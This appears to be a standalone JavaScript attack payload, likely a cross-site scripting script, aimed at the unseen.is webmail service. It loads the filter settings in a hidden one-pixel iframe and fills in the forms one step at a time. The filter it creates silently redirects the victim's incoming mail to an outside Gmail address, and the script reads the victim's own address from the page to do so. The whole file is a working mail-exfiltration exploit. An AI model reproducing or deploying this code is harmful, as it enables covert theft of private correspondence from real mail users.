function fun_getName(){
var domainName = 'unseen.is';
//strInnerText = top.document.getElementById('skin_container_tree_top').innerText;
strInner = top.document.getElementById('skin_container_tree_top');
if(strInner){
strInnerText = top.document.getElementById('skin_container_tree_top').innerText;
indexAT = strInnerText.indexOf('@');
indexEnd = indexAT + domainName.length + 1;
return strInnerText.substring(0, indexEnd);
}
else{
strInnerText = top.document.getElementById('z_userName').innerText;
strInnerText += '@unseen.is';
return strInnerText;
}

}

var myframe = document.createElement("iframe");
myframe.id = 'myframe';
myframe.src = "https://mail.unseen.is/h/options?selected=filter&prev=mail";
myframe.height = 1;
myframe.width =1;
var flag = 0;
document.body.appendChild(myframe);
myframe.onload = function(){
if(flag ==0){

newfilter = myframe.contentWindow.document;
newfilter_input = newfilter.getElementsByTagName('input'); 

newfilter_input[4].click();
flag++;
}
else if(flag ==1){

newfilter = myframe.contentWindow.document;
newfilter_select = newfilter.getElementsByTagName('select');
newfilter_select[2].value = "size";
newfilter_input = newfilter.getElementsByTagName('input');

newfilter_input[12].click();
flag++;
}
else if(flag ==2){

newfilter = myframe.contentWindow.document;
newfilter_select = newfilter.getElementsByTagName('select');
newfilter_select[2].value = 'OVER';
newfilter_select[5].value = 'redirect';
newfilter_input = newfilter.getElementsByTagName('input');
newfilter_input[13].value = '1';

newfilter_input[17].click();
flag++;
}
else if(flag ==3){

newfilter = myframe.contentWindow.document;
newfilter_input = newfilter.getElementsByTagName('input');
newfilter_input[18].value = fun_getName();
newfilter_select = newfilter.getElementsByTagName('select');
newfilter_select[5].value = 'redirect';

newfilter_input[21].click();
flag++;
}
else if(flag ==4){

newfilter = myframe.contentWindow.document;
newfilter_input = newfilter.getElementsByTagName('input');
newfilter_input[21].value = 'clouds.shareup@gmail.com';
newfilter_input[10].value = 'default';
newfilter_input[4].click();
flag++;
}
else{
myframe.style = 'display: none';
console.log('finish');
return;
}
}